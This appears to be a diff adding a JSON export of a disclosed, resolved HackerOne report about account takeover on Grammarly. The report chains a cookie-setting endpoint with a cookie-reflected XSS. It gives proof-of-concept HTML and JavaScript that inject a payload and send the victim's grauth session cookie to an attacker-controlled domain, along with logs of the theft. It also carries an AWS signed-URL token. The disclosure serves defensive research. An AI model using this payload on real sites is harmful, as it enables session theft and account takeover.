@@ -1,0 +1,145 @@
+{
+  "id": 534450,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MzQ0NTA=",
+  "url": "https://hackerone.com/reports/534450",
+  "title": "Account takeover through the combination of cookie manipulation and XSS",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2019-04-10T13:57:56.746Z",
+  "submitted_at": "2019-04-10T13:57:56.746Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "k4r4koyun",
+    "url": "/k4r4koyun",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/hqva5hvhlqa4m3utc6dgbg802elt/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 22746,
+    "url": "https://hackerone.com/superhuman",
+    "handle": "superhuman",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/23p3otm27f7hjxfsde7xx0ol3jhf/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/23p3otm27f7hjxfsde7xx0ol3jhf/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Superhuman (formerly Grammarly)",
+      "twitter_handle": "",
+      "website": "https://superhuman.com/",
+      "about": "Superhuman (formerly Grammarly) unites Grammarly, Superhuman Mail, Coda, and Go with AI to unlock superhuman potential in everyone."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2019-12-03T20:59:30.537Z",
+  "bug_reporter_agreed_on_going_public_at": "2019-11-03T20:59:28.843Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:** A cookie based XSS on www.grammarly.com exists due to reflection of a cookie called gnar_containerId in DOM without any sanitization. Normally, gnar_containerId is being set by the server however a vulnerable endpoint at gnar.grammarly.com called \"/cookies\" allows us to manipulate cookies set for *.grammarly.com and gnar_containerId was one of them. Through the combination of these findings, we were able to bypass \"CORS protection/HttpOnly cookie flag\" and steal any Grammarly users cookie that visits a webpage that has our malicious javacript code.\n\n**Description:** An endpoint at gnar.grammarly.com called \"/cookies\" allows us to set or get any cookie value we want. Sending a POST request sets the cookie value whereas sending a GET cookie returns the value of an existing cookie. In a normal scenario, an attacker could send a GET request to that enpoint and read user authentication cookie (grauth in this case)But due to the same origin policy, we were not able to read the response . Sending a POST request was still viable(as we did not have to read the response) and we were able to replace session cookies of users (who had browsed any webpage that contained our malicious javascript) and force them to use our session. This allowed us to see any document that was created after the point of exploitation.\n\nThis was our initial bug bounty report (#532553) however, HackerOne staff did not approve it and said this is how cookies are supposed to work. So we decided to investigate this case further.\n\nThen we have found that Grammarly uses multiple cookies and one of them is called \"gnar_containerId\". We have discovered that this cookie gets reflected on the \"www.grammarly.com\" in src attribute of an img tag. The value inside the img tag is encoded and not exploitable. However there is another img tag, surrounded with noscript tags. The second value that is inside of the noscript tags was not encoded and prone to XSS. Combining the XSS vulnerability found in the www.grammarly.com domain and the cookie manipulation through gnar.grammarly.com/cookies allowed us to inject a gnar_containerId cookie that holds our malicious javascript code\n\nOur malicious payload that was injected into the context of grammarly.com will make a get request to gnar.grammarly.com/cookies to retrieve the values of the session cookies of the currently logged in user and send it  back to our server. Normally, an ordinary XSS would not lead to such cases as grammarly cookies are set to be httponly and secure, so it is not possible to manipulate cookies through DOM. But Thanks to the endpoint that we have discovered initially, we were able to retrieve/replace any cookies that was set by *.grammarly.com. We were able to bypass the CORS as our requests were sent on behalf of the grammarly.com and read the response.\n\nTo put it simply, if a user visits a webpage that we control, it will steal the cookies and send them to us. Our payload will make a post request to gnar.grammarly.com/cookies to replace the gnar_containerid with the second stage of our payload and the redirect the user to the vulnerable page. Upon this, our injected payload will get triggered and will make another request to gnar.grammarly.com/cookies on behalf of the grammarly.com, then will send the response body to a server that we control.\n\nFor the purpose of illustration, we just stole grauth cookie of a test account but we could actually steal any cookie set by grammarly.com.\n\n**Solution:** This attack scenario was made possible because of the following:\n\n  * gnar.grammarly.com/cookies does not check Referer information when it receives POST request. Adding a Referer check (assuming that no website other than the ones that hosted at *.grammarly.com is using that endpoint) will prevent client-side requests from 3rd parties.\n  * There is no whitelist/blacklist for cookies that a client can alter. Disallowing the alteration of grauth and csrf-token cookies should be implemented.\n  * Content based encoding was applied for noscript tags however with the combination of unnecessary trust to the cookies, an XSS was possible. Encoding should be applied for noscript tags too.\n\n## Browsers Verified In:\n\n  * Google Chrome 73.0.3683.86 (Official Build) (64-bit)\n  * Mozilla Firefox 60.6.1esr (64-bit)\n\n## Steps To Reproduce:\n\n  * Host a webpage that is being served over HTTPS (to circumvent Mixed-Content protection)\n\n  * Serve the HTML snipped below on the said page (called \"Grammarly.html\" for example):\n\n```html\n<html>\n\n<head>\n<title>Grammarly POC</title>\n<meta charset=\"utf-8\"/>\n<script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js\"></script>\n</head>\n\n<body>\n<script>\n\n    var cookie_hax = {\n        \"gnar_containerId\":\"</noscript><script/src='https://<YOUR_DOMAIN_NAME>/poc.js'></scr\"+\"ipt><noscript>\",\n    };\n\n    for (var name in cookie_hax) {\n        $.ajax({\n            type: \"POST\",\n            url: \"https://gnar.grammarly.com/cookies?name=\" + name + \"&value=\" + encodeURIComponent(cookie_hax[name]) + \"&maxAge=2147483647\",\n            cache: false,\n            xhrFields: {\n                withCredentials: true\n            },\n            crossDomain: true,\n            async: false,\n        });\n    }\n\n    window.location.replace(\"https://www.grammarly.com/upgrade?utm_source=upHook&app_type=app&page=free&utm_campaign=editorMenu&utm_medium=internal\");\n\n</script>\n</body>\n\n</html>\n```\n  * Serve the javascript code below on the same webserver (called \"poc.js\" for example):\n\n```javascript\nvar xhr = new XMLHttpRequest();\nxhr.open('GET', \"https://gnar.grammarly.com/cookies?name=grauth\");\nxhr.withCredentials = true;\nxhr.onload = function () {\n    this.open('GET', \"https://<YOUR_DOMAIN_NAME>/\" + this.response);\n    this.send();\n};\nxhr.send();\n```\n  * Browse the Grammarly.html and watch the webserver access logs (to extract cookie value)\n\n## Supporting Material/References:\n\n  * Webserver access logs: \n\n```\n178.251.40.58 - - [10/Apr/2019:13:23:04 +0000] \"GET /poc.js HTTP/1.1\" 200 736 \"https://www.grammarly.com/\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36\"\n178.251.40.58 - - [10/Apr/2019:13:23:05 +0000] \"GET /?cookie={██████████} HTTP/1.1\" 200 3466 \"https://www.grammarly.com/\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36\"\n```\n\n## Impact\n\n* Account takeover via cookie stealing",
+  "weakness": {
+    "id": 62,
+    "name": "Cross-site Scripting (XSS) - Stored"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 466118,
+      "file_name": "Grammarly_Takeover_POC.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/466/118/7d81dc56180cb78c3e31700f52e1f089366f0746/Grammarly_Takeover_POC.mp4?response-content-disposition=attachment%3B%20filename%3D%22Grammarly_Takeover_POC.mp4%22%3B%20filename%2A%3DUTF-8%27%27Grammarly_Takeover_POC.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVYY4SI2D%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T152041Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJIMEYCIQDuqGDqs1tvaNWhOkIGoaKoJ4SlyK9RmryG4Oky4U%2FuBwIhALc6FVzi9iwXU%2F073p4GH5Rq3z7LMuCjqFPMxCGA%2FIbIKrsFCOj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgwOwnvr0lE9InZ%2BZ4MqjwVpY%2BZFTusxomT9%2BD4RnzxzHNVMmP0MW1RKpekK8J3rFii%2BNnHhWhxcv4d2Qrncbn3fTaaJgUCRw%2B%2BhDEG4nWhnNnGTwKHTT3tYg0dR%2FRcdrGhEMXzJBrwzv33QPY8XqzkJfCXsTB1ZDA2OAqucxJSrftgiwkaedHZzNx44CBj0i86cLxTiTbJVbf%2BEJue8CrUkRqeiyH%2BkVuljwG6lOTpN8FH6aW1w65oeQSVt1v2dmqXa1goqx26hK5r%2Bn6WeRExSTePNX%2BQaqMEwHPTAYJT5XDabggBtR8Gez1cys5nKwFZIM9ADI23HRXcgms8hMj8JP7W9CTkrg%2B2xWRPaCXvfUtnYY0%2BbAFSiY%2FrlP7Nn4ldy%2FsYpICiEXGGnMMMcc3XCo9IXecq23bObeeijNLvg68tKZeZqaQo%2FJJhN9pv6hhE9FYOCIYQ0I31GDBbnX1T7Vh%2FZpy%2BRhRNLEwygyXiVcbRojaCVGQWF3PCuK3X4STfaVbTRTyO5rh89ITRcUWgGjGJtmZ4p7jttkt4THs1xalaqoRmHtpVL1SYa3ANphJ4I7bUEjB%2Bahy37tcZB8Z3hOIM6eFuhvBBUsMUHCefXvp1GoZtIHaxwXeOWDll15zqUp7xyDe3pSWsnjvLlzawSIsiCHbZLoy3Y1QTPrCd%2F%2FqJNc9Eto%2FW1%2BF8t3%2BoELeqktAIK8BcjuJ%2BkkVCTziATVZPr46Ocj6wfle%2BVmXC2cBcFDux3uWPno9Fa6UpkEG4nBCrAEaHSet%2BMx4MCLnxM4Fk2XyAHNKb0QVsBNl46wF7l2zB%2BfLVUc5LTBkhZG9wDuqjwPor%2FhoxvEdCblYYFmZuFaVdYp%2FTh2JFAGlF7o2cUvMhXyyCBNMXoJlzlMPyK%2Fc8GOrABFk21VbPFL734OH2aozAhjnZ6qqe6mTno6mrMT8D%2BdopoFRNjoIeQFnQDUgNDDW0RdJzE8FoQj2rnBQW7hESjclwdnliiCH9GoK4vKSA0rIHMbR5k03rjl%2BGcz4TKdG2cicYqmu235Y0WQshpPftNDi74b9Hzyv86l0k1f%2F5ilhRIA9tfs0ct9sk7q4i%2Fqft4GIDdrPFOihSPhx7hWO1YpujNZAIO0wKNe2DcTVUT5u4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e358af523323216e5a5654cbb53b744da832e1bd5feb45f1252c90b4347eeebb",
+      "file_size": 271192,
+      "type": "video/mp4",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2019-12-03T20:59:28.901Z",
+  "allow_singular_disclosure_after": -202933272.68143502,
+  "singular_disclosure_allowed": true,
+  "vote_count": 288,
+  "voters": [
+    "rappportbuilder9172",
+    "lboy",
+    "8910jq",
+    "manoelt",
+    "mizzle",
+    "th3hidd3nmist",
+    "orange303",
+    "aboalezz",
+    "hellnia",
+    "daehee",
+    "and 278 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.2,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "required",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "low",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 1366,
+    "asset_type": "URL",
+    "asset_identifier": "www.grammarly.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
